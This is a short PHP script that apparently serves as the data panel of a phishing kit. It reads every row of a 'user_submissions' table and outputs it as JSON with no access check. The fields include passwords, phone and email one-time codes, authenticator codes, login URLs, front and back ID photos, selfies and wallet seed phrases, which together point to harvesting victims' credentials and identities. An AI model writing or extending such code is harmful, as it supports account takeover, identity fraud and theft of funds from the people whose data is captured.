<?php
require_once 'db_connection.php';

$sql = "SELECT id, token, activity, email, data, status, password, phone_otp, created_at, updated_at, ip_address, user_agent, auth_app, login_url, email_otp, email_app, front, back, selfie, seed FROM user_submissions";
$result = $conn->query($sql);

$data = array();
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        $data[] = $row;
    }
}

echo json_encode($data);

$conn->close();
?>